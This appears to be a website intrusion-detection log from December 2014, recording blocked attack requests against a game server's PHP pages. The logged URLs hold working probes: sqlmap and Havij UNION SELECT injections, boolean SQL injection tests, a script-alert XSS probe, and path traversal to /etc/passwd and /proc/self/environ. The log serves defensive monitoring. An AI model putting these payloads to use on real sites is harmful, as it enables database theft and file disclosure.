
7-12-2014 19:23:24 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:24 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:24 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%29%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:25 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:25 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:26 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:26 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:26 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:27 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:27 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:27 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:27 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:28 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:28 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:29 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:29 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:29 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:29 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:30 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:30 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:31 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:31 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

7-12-2014 19:23:31 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: sqlmap/1.0-dev-d400dc2 (http://sqlmap.org) | URL: /index.php?page=jucatori&id=2%25%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20&attempt=1 | Referer: no referer

9-12-2014 11:24:21 | Bots attack | IP: <redacted> ] | DNS: <redacted> | Agent: Wget/1.12 (linux-gnu) | URL: /Acasa?attempt=2 | Referer: no referer

10-12-2014 18:21:54 | Bots attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en; rv:1.9.0.13) Gecko/2009073022 Firefox/3.5.2 (.NET CLR 3.5.30729) SurveyBot/2.3 (DomainTools) | URL: /Acasa?attempt=2 | Referer: http://whois.domaintools.com/metin2rapsodia.ro

14-12-2014 12:34:02 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=jucatori%27%20aNd%20%277%27=%277 | Referer: no referer

14-12-2014 12:34:03 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=jucatori%27%20aNd%20%277%27=%272 | Referer: no referer

14-12-2014 12:38:30 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%277 | Referer: no referer

14-12-2014 12:38:30 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%272 | Referer: no referer

14-12-2014 12:38:32 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=smscod%27%20aNd%20%277%27=%277 | Referer: no referer

14-12-2014 12:38:33 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=smscod%27%20aNd%20%277%27=%272 | Referer: no referer

14-12-2014 16:51:33 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=jucatori%27%20aNd%20%277%27=%277 | Referer: no referer

14-12-2014 16:51:33 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=jucatori%27%20aNd%20%277%27=%272 | Referer: no referer

14-12-2014 16:55:14 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%277 | Referer: no referer

14-12-2014 16:55:14 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%272 | Referer: no referer

14-12-2014 16:55:15 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%277 | Referer: no referer

14-12-2014 16:55:15 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%272 | Referer: no referer

20-12-2014 06:44:29 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=jucatori%27%20aNd%20%277%27=%277 | Referer: no referer

20-12-2014 06:44:29 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=jucatori%27%20aNd%20%277%27=%272 | Referer: no referer

20-12-2014 06:45:11 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=jucatori%27%20aNd%20%277%27=%277 | Referer: no referer

20-12-2014 06:45:12 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=jucatori%27%20aNd%20%277%27=%272 | Referer: no referer

20-12-2014 06:46:22 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /Acasa?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E | Referer: no referer

20-12-2014 06:46:22 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /Acasa?search=alert(1) | Referer: no referer

20-12-2014 06:46:22 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /Acasa?page=../../../../../../../../../etc/passwd%00.jpg | Referer: no referer

20-12-2014 06:46:22 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /Acasa?param=cmd.exe | Referer: no referer

20-12-2014 06:46:22 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /Acasa?param=-1+UNION+SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables | Referer: no referer

20-12-2014 06:48:25 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%277 | Referer: no referer

20-12-2014 06:48:26 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%272 | Referer: no referer

20-12-2014 06:48:47 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%277 | Referer: no referer

20-12-2014 06:48:47 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%272 | Referer: no referer

20-12-2014 06:51:42 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%277 | Referer: no referer

20-12-2014 06:51:52 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%272 | Referer: no referer

20-12-2014 06:52:28 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%277 | Referer: no referer

20-12-2014 06:52:29 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%272 | Referer: no referer

20-12-2014 07:20:58 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=jucatori%27%20aNd%20%277%27=%277 | Referer: no referer

20-12-2014 07:20:58 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=jucatori%27%20aNd%20%277%27=%272 | Referer: no referer

20-12-2014 07:22:43 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%277 | Referer: no referer

20-12-2014 07:22:44 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%272 | Referer: no referer

20-12-2014 07:22:46 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%277 | Referer: no referer

20-12-2014 07:22:47 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 | URL: /index.php?page=sms%27%20aNd%20%277%27=%272 | Referer: no referer

20-12-2014 07:26:18 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?page=../../../../../../../../../etc/passwd%00.jpg | Referer: no referer

20-12-2014 07:26:19 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?param=cmd.exe | Referer: no referer

20-12-2014 07:26:19 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?param=-1+UNION+SELECT+GROUP_CONCAT(table_name)+FROM+information_schema.tables | Referer: no referer

20-12-2014 07:26:19 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?search=alert(1) | Referer: no referer

20-12-2014 07:26:19 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0) | URL: /index.php?search=%3Cscript%3Ealert(1)%3C%2Fscript%3E | Referer: no referer

20-12-2014 07:30:19 | URL protect | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 | URL: /index.php?page=bresle&id=2&directLinks=../../../../../../../../../../../../../../etc/passwd | Referer: no referer

20-12-2014 07:30:52 | XSS attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 | URL: /index.php?page=bresle&id=3&directLinks=../../../../../../../../../../../../../../proc/self/environ | Referer: no referer

23-12-2014 08:16:30 | Bots attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 RPT-HTTPClient/0.3-3 | URL: /Inregistrare? | Referer: no referer

23-12-2014 08:19:49 | Bots attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 RPT-HTTPClient/0.3-3 | URL: /acasa? | Referer: no referer

23-12-2014 17:53:14 | Bots attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 RPT-HTTPClient/0.3-3 | URL: /Inregistrare? | Referer: no referer

24-12-2014 00:48:42 | Bots attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11 RPT-HTTPClient/0.3-3 | URL: /index.php?page=jucatori-activi | Referer: no referer

26-12-2014 16:34:12 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:12 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:13 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:13 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:13 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:13 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:13 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:13 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:14 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:14 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:14 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:14 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:14 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:14 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:15 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:15 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:15 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:15 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

26-12-2014 16:34:15 | Union attack | IP: <redacted> ] | DNS: <redacted> | Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727) Havij | URL: /index.php?page=999999.9+union+all+select+0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536%2C0x31303235343830303536-- | Referer: no referer

